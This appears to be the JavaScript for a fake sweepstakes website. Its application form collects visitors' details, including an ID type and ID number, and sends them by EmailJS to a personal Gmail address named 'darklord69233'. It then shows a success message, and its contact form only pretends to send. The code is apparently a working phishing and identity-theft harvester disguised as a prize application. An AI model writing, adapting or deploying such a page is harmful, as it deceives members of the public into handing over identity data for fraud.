document.addEventListener('DOMContentLoaded', () => {
  const navLinks = Array.from(document.querySelectorAll('.nav-links a'));
  const sections = Array.from(document.querySelectorAll('main section[id]'));
  const form = document.getElementById('application-form');
  const message = document.getElementById('form-message');
  const idTypeSelect = document.getElementById('idType');
  const idNumberLabel = document.getElementById('idNumberLabel');
  const contactForm = document.getElementById('contact-form');
  const successOverlay = document.getElementById('success-overlay');
  const EMAILJS_PUBLIC_KEY = 'URPg7uugKsgNe5s32';
  const overlayTitle = document.getElementById('overlay-title');
  const overlayText = document.getElementById('overlay-text');
  const closeSuccessOverlay = document.getElementById('close-success-overlay');

  function showFeedbackOverlay(title, body) {
    if (!successOverlay || !overlayTitle || !overlayText) return;
    overlayTitle.textContent = title;
    overlayText.textContent = body;
    successOverlay.hidden = false;
  }

  function hideFeedbackOverlay() {
    if (successOverlay) {
      successOverlay.hidden = true;
    }
  }

  if (closeSuccessOverlay) {
    closeSuccessOverlay.addEventListener('click', hideFeedbackOverlay);
  }

  if (successOverlay) {
    successOverlay.addEventListener('click', (event) => {
      if (event.target === successOverlay) {
        hideFeedbackOverlay();
      }
    });
  }

  // Initialize EmailJS
  if (typeof emailjs !== 'undefined') {
    emailjs.init(EMAILJS_PUBLIC_KEY);
  }

  function setActiveLink() {
    const scrollPos = window.scrollY + 120;
    let current = 'home';

    sections.forEach((section) => {
      if (scrollPos >= section.offsetTop) current = section.id;
    });

    navLinks.forEach((link) => {
      const isActive = link.getAttribute('href') === `#${current}`;
      link.classList.toggle('active', isActive);
    });
  }

  window.addEventListener('scroll', setActiveLink);
  setActiveLink();

  navLinks.forEach((link) => {
    link.addEventListener('click', () => {
      navLinks.forEach((item) => item.classList.remove('active'));
      link.classList.add('active');
    });
  });

  if (idTypeSelect && idNumberLabel) {
    idTypeSelect.addEventListener('change', () => {
      if (idTypeSelect.value !== '') {
        idNumberLabel.style.display = 'flex';
      } else {
        idNumberLabel.style.display = 'none';
      }
    });
  }

  if (form) {
    form.addEventListener('submit', (event) => {
      event.preventDefault();
      
      // Collect all form data and combine into single message
      const formData = new FormData(form);
      let messageBody = 'Sweepstakes Application Details:\n\n';
      
      for (let [key, value] of formData.entries()) {
        if (key !== 'idNumber' || idNumberLabel.style.display !== 'none') {
          messageBody += `${key}: ${value}\n`;
        }
      }
      
      console.log('Message body:', messageBody);
      
      const templateParams = {
        message: messageBody,
        to_email: 'darklord69233@gmail.com'
      };
      
      console.log('Template params:', templateParams);
      
      // Send email using EmailJS
      if (typeof emailjs !== 'undefined') {
        emailjs.send('service_iqvfy0k', 'template_mjukwjj', templateParams, EMAILJS_PUBLIC_KEY)
          .then(function(response) {
            console.log('EmailJS success:', response);
            if (message) {
              message.textContent = '';
            }
            showFeedbackOverlay('Application Submitted', 'Your application was received successfully. Thank you for applying.');
            form.reset();
            if (idNumberLabel) {
              idNumberLabel.style.display = 'none';
            }
          }, function(error) {
            console.error('EmailJS error:', error);
            if (message) {
              message.textContent = 'Error submitting application. Please try again.';
            }
            showFeedbackOverlay('Submission Issue', 'We could not complete your submission. Please try again.');
          });
      } else {
        console.error('EmailJS not loaded');
        if (message) {
          message.textContent = 'Email service not available. Please try again later.';
        }
        showFeedbackOverlay('Submission Issue', 'The email service is currently unavailable. Please try again later.');
      }
    });
  }

  if (contactForm) {
    const contactMessage = document.getElementById('contact-message');
    contactForm.addEventListener('submit', (event) => {
      event.preventDefault();
      if (contactMessage) {
        contactMessage.textContent = 'Message sent successfully! We will get back to you soon.';
      }
      contactForm.reset();
    });
  }
});
